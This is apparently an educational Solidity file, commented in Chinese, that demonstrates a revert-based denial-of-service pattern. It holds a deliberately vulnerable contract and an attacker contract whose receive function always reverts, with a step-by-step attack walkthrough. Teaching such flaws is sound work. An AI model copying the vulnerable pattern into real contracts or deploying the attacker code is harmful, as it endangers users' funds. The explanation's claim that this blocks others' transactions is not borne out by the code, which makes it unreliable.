// Vulnerability Code (錯誤的交易定義漏洞示範)
// 這個範例展示了一個契約在同一個交易中依序執行狀態改變與外部呼叫，
// 若外部呼叫因攻擊者合約的 fallback function 故意 revert，則整個交易將會回滾，
// 攻擊者可利用這個特性來阻斷某些交易的成立。

pragma solidity >=0.8.0;

// 攻擊者可建立一個惡意合約，讓任何轉入 Ether 的呼叫都 revert
contract Attacker {
    // fallback 函數會立即 revert
    receive() external payable {
        revert("Attack: reverting on receiving funds");
    }

    // 攻擊入口，呼叫 VulnerableContract.execute 並傳送 Ether
    function attack(address _vulnerable) public payable {
        // 呼叫 VulnerableContract 的 execute() 函數，注意此函數內會進行 inline 外部呼叫
        // 此交易在 inline 呼叫失敗時將完全回滾
        (bool success, ) = _vulnerable.call{value: msg.value}(abi.encodeWithSignature("execute()"));
        require(success, "Attack failed");
    }
}

// 漏洞合約：在同一個交易中更新狀態與進行外部呼叫，這裡 inline 呼叫導致如果外部呼叫失敗，
// 則前面的狀態更新也會一併回滾。
contract VulnerableContract {
    // 狀態變數：累計存入的 Ether
    uint public total;

    // execute() 函式同時更新狀態與進行 inline 外部呼叫
    function execute() public payable {
        // 狀態更新，累計轉入的金額
        total += msg.value; // <-- 漏洞重點：狀態改變與外部呼叫在同一交易中

        // inline 外部呼叫：將收到的 Ether 立即回傳給呼叫者
        // 如果呼叫者（例如惡意合約）的 fallback function 發生 revert，
        // 則 require 會導致整個交易回滾，狀態改變也會被取消。
        (bool success, ) = msg.sender.call{value: msg.value}("");
        require(success, "Call failed");
    }

    // fallback 接收 Ether
    receive() external payable {}
}

/*
攻擊流程說明：
1. 部署 VulnerableContract 與 Attacker 合約。
2. 攻擊者從 Attacker 合約呼叫 attack() ，並傳入一定的 Ether。
3. VulnerableContract.execute() 被呼叫，total 會增加，但接著試圖透過 inline call 回傳 Ether。
4. 由於 Attacker 的 fallback 函數會 revert，導致 require 失敗，整個交易回滾，
   使得 total 增加的動作也被取消。
這種設計讓攻擊者能夠藉由惡意回傳使得交易無法完成，進而干擾合約操作。
*/